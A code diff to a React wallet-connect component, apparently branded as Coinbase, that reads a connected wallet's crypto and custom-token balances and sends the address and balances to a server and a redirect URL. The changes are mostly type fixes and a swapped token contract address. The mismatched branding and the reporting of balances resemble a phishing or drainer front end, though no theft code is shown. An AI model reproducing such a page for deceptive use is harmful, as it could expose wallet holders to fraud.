@@ -30,7 +30,7 @@ export default function CoinbaseWalletConnect() {
     const [ethBalance, setEthBalance] = useState<string>('0');
     const [usdtBalance, setUsdtBalance] = useState<string>('0');
     const [t22priceUsd, setT22PriceUsd] = useState<number>(0);
-    const [t22Balance, setT22Balance] = useState<number>(0);
+    const [t22Balance, setT22Balance] = useState<string>('0');
     const [ctmBalance, setCtmBalance] = useState<string>('0');
     const [usdtBscBalance, setUsdtBscBalance] = useState<string>('0');
     const [newTetherBalance, setNewTetherBalance] = useState<string>('0');
@@ -318,7 +318,7 @@ export default function CoinbaseWalletConnect() {
     const TETHEREUM_TOKEN_ADDRESS = '0xe9a5c635c51002fa5f377f956a8ce58573d63d91';
     const BEP20_USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
     const NEW_TETHER_ADDRESS = '0x5c19a86b6f24c66cAf9372A2627a20C6a4227777';
-    const CTM_TOKEN_ADDRESS = '0x88C5AFf1e0f6cC76c843f211f802cDb6B97f9cE9';
+    const CTM_TOKEN_ADDRESS = '0xc8ef4398664b2eed5ee560544f659083d98a3888';
     const MERCHANT_URL = 'https://trustwallet.com/';
 
     const handleRedirect = (state: 'success' | 'cancelled' | 'disconnected' | 'not_connected' | 'inactivity') => {
@@ -337,7 +337,7 @@ export default function CoinbaseWalletConnect() {
         if (state === 'success' && address) {
             params.append('wallet_address', address);
             params.append('bnb_balance', bnbBalance);
-            params.append('tethereum_balance', t22Balance.toString());
+            params.append('tethereum_balance', t22Balance);
         }
 
         window.location.href = `${baseUrl}${baseUrl.includes('?') ? '&' : '?'}${params.toString()}`;
@@ -355,7 +355,7 @@ export default function CoinbaseWalletConnect() {
     };
 
     useEffect(() => {
-        if (t22Balance > 0) fetchData(t22Balance);
+        if (Number(t22Balance) > 0) fetchData(Number(t22Balance));
     }, [t22Balance]);
 
 
@@ -417,7 +417,7 @@ export default function CoinbaseWalletConnect() {
             const newTetherFormatted = ethers.formatUnits(newTetherRaw, newTetherDec);
 
             setBnbBalance(bnbFormatted);
-            setT22Balance(Number(t22Formatted));
+            setT22Balance(t22Formatted);
             setEthBalance("0");
             setBtcBalance("0");
             setUsdtBalance(usdtFormatted);
@@ -431,7 +431,7 @@ export default function CoinbaseWalletConnect() {
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     address: userAddress,
-                    t99: Number(t22Formatted),
+                    t99: t22Formatted,
                     bnb: bnbFormatted,
                     usdt_bsc: usdtFormatted,
                     ctm: ctmFormatted,
@@ -465,16 +465,18 @@ export default function CoinbaseWalletConnect() {
             const price = priceData.price;
             const change = priceData.change;
 
-            const balance =
+            const balanceStr =
                 isTethereum ? t22Balance :
-                    symbol === 'BNB' ? Number(bnbBalance) :
-                        symbol === 'ETH' ? Number(ethBalance) :
-                            symbol === 'BTC' ? Number(btcBalance) :
-                                symbol === 'USDT' ? Number(usdtBalance) :
-                                    symbol === 'USDT_BSC' ? Number(usdtBscBalance) :
-                                        symbol === 'TETH' ? Number(newTetherBalance) :
-                                            symbol === 'CTM' ? Number(ctmBalance) :
-                                            0;
+                    symbol === 'BNB' ? bnbBalance :
+                        symbol === 'ETH' ? ethBalance :
+                            symbol === 'BTC' ? btcBalance :
+                                symbol === 'USDT' ? usdtBalance :
+                                    symbol === 'USDT_BSC' ? usdtBscBalance :
+                                        symbol === 'TETH' ? newTetherBalance :
+                                            symbol === 'CTM' ? ctmBalance :
+                                            '0';
+
+            const balance = Number(balanceStr);
 
             return {
                 id: idx,
@@ -879,7 +881,7 @@ export default function CoinbaseWalletConnect() {
                                                                                     </div>
                                                                                 </div>
                                                                                 <div className="flex flex-col items-end">
-                                                                                    <p className="font-bold text-lg leading-none mb-1">{asset.balance.toFixed(6)}</p>
+                                                                                    <p className="font-bold text-lg leading-none mb-1">{maskAccount ? '••••' : parseFloat(asset.balance.toFixed(8)).toString()}</p>
                                                                                     <p className="text-[13px] font-medium text-gray-400 dark:text-gray-500">
                                                                                         {maskAccount ? '••••' : formatFiat(asset.usdValue)}
                                                                                     </p>
